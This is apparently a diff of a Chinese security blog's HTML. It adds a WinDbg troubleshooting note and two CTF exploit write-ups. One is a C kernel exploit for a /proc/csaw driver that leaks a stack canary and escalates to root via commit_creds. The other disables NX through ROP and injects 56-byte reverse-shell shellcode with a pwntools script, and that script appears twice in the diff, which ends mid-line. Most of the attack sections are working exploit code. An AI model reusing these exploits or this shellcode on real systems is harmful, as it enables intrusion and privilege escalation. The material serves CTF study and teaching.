-<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/windbg学习总结/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/windbg学习总结/">windbg学习总结</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="无法正确输出地址问题"><a href="#无法正确输出地址问题" class="headerlink" title="无法正确输出地址问题"></a>无法正确输出地址问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReadMemory error for address eeddccee</span><br><span class="line">Use `!address eeddccee&apos; to check validity of the address.</span><br></pre></td></tr></table></figure>
+<h1 id="无法正确断下点问题"><a href="#无法正确断下点问题" class="headerlink" title="无法正确断下点问题"></a>无法正确断下点问题</h1><pre><code>address命令正确的指示了该地址为私有堆内存，但该内存页不可访问。
+检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options，确定已经正确的设置了，
+尝试其他多种设置，甚至换工具进行设置，但结依然如此。
+难道是机器问题？于是在win732位机器上重复上述过程，
+发现是可以正确的打印出堆内存指针被释放的栈回溯的。
+但更换其他xp机器依然不能正确显示。
+&quot;CTEST* pCTest = new CTEST(); &quot;的栈回溯几率，
+即申请堆内存的记录，但始终未找到释放堆内存的记录。
+于是再次怀疑xp下的页堆并没有真正启动或启动是有问题的，
+于是检查下页堆启动情况：
+“ReadMemory error for address eeddccee”，  
+且只展示一个Page Heap句柄了，剩下的未展示完全，
+但页堆明明白白的现实已经开启，也有了准页堆，
+但数据却显示不出来，说明数据可能被破坏，
+但测试代码如此简单，而且也被windbg第一时间断下，
+不可能去破坏数据，换成6.6.0007.5版即可解决。
+试了下果然在xp下顺利输出了用户态栈回溯。
+Win7下的 _STACK_TRACE_DATABASE 结构和xp下并不完全相同，
+关键的 Buckets（栈回溯记录）的结构偏移改了，
+而且原xp下是个数组，但win7下却变成了链表，
+故猜测高版本的Windbg在xp下依然使用了win7下的某些数据结构，
+从而导致Windbg解析出了问题。
+</code></pre><h2 id="无法正确下堆断点"><a href="#无法正确下堆断点" class="headerlink" title="无法正确下堆断点"></a>无法正确下堆断点</h2><pre><code>peb错误
+输入如下代码
+就可以！gflag
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.sympath srv*C:\symblol*http://msdl.microsoft.com/download/symbols </span><br><span class="line">.reload</span><br></pre></td></tr></table></figure>
+<h2 id="active控件分析方法"><a href="#active控件分析方法" class="headerlink" title="active控件分析方法"></a>active控件分析方法</h2><pre><code>alt+e进入oleaut32
+ctrl+n 找到DISPCALLFUNC
+找到首个 call ecx
+</code></pre>
       
     </div>
     
@@ -543,6 +539,76 @@ junk+CANARY+ebp+payload_addr
 h可以看到，我们的dump程序可以正常dump出CANARY的值，
 那么下面的工作就很简单了，直接可以利用这个leak，构造payload去拿root shell了。
 </code></pre><h1 id="0x04-Exploit"><a href="#0x04-Exploit" class="headerlink" title="0x04 : Exploit"></a>0x04 : Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>, <span class="string">"sh"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_tf</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"pushl %cs; popl tf+4;"</span></span><br><span class="line">        <span class="string">"pushfl; popl tf+8;"</span></span><br><span class="line">        <span class="string">"pushl %esp; popl tf+12;"</span></span><br><span class="line">        <span class="string">"pushl %ss; popl tf+16;"</span>);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067fc0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xc1067e20</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"mov $tf,%esp;"</span></span><br><span class="line">       <span class="string">"iret;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"errorn"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,<span class="number">16</span>,SEEK_CUR);</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd,buffer,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="comment">//memset(buffer,0x41,64);</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" | "</span>);</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,buffer[i*<span class="number">16</span>+j] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> canary[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(canary,buffer+<span class="number">32</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CANARY:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x"</span>,canary[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"n"</span>);</span><br><span class="line">    <span class="keyword">char</span> poc[<span class="number">84</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(poc,<span class="number">0x41</span>,<span class="number">76</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(poc+<span class="number">64</span>,canary,<span class="number">4</span>);<span class="comment">//set canary</span></span><br><span class="line">    *((<span class="keyword">void</span>**)(poc+<span class="number">64</span>+<span class="number">4</span>+<span class="number">4</span>)) = &amp;payload;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]payload:%sn"</span>,poc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Triger bug:n"</span>);</span><br><span class="line">    <span class="comment">//init tf struct;</span></span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd,poc,<span class="number">76</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/关闭nx与反弹shell/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/07/07/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
+在本題中明顯提供解題者一個stack buffer overflow的漏洞，
+但因為程式有NX保護，必須使用ROP來控制程式行為。
+在寫入的第12byte後開始覆蓋main的return address，
+共計有88 bytes的overflow空間。
+在程式read完以後便切斷該程式對client的連線，
+即使拿到shell也無法操控該shell。
+</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
+但如果全部只使用ROP最多只能放入22個gadgets
+（包括argument與padding等等）。
+所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
+接著便可以shellcode來產生一個reverse shell。
+</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
+將__libc_stack_end的address放入eax中。
+调用_dl_make_stack_executable。
+解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。
+
+放入reverse shell的shellcode
+建立reverse shell須執行socket、dup2、connect、execve等指令，
+由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
+剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：
+
+想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
+由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
+若能應用當時程式的某些state便可減少一點size。
+由於fd中0、1、2皆已被close，
+拿到的socket fd即已為0，因此只需進行一次dup2。
+由於ebp可控（ebp的值會等於input中的第8~11 byte），
+由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
+push port時使用ax中已有的數值（0x66），
+port（big endian）將被固定為0x6600（26112）。
+</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
+<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -827,54 +893,11 @@ h可以看到，我们的dump程序可以正常dump出CANARY的值，
 
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/漏洞挖掘/">2018-07-07</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2018/07/07/漏洞挖掘/">漏洞挖掘</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="人工代码审计"><a href="#人工代码审计" class="headerlink" title="人工代码审计"></a>人工代码审计</h2><h2 id="内存漏洞：高危函数"><a href="#内存漏洞：高危函数" class="headerlink" title="内存漏洞：高危函数"></a>内存漏洞：高危函数</h2><h2 id="自动化代码审计"><a href="#自动化代码审计" class="headerlink" title="自动化代码审计"></a>自动化代码审计</h2><pre><code>污点分析
-fuzzing
-符号执行
-静态审计
-攻击表面分析：监控文件执行记录重要行为 网络数据分析
-</code></pre><h1 id="angr例子"><a href="#angr例子" class="headerlink" title="angr例子"></a>angr例子</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 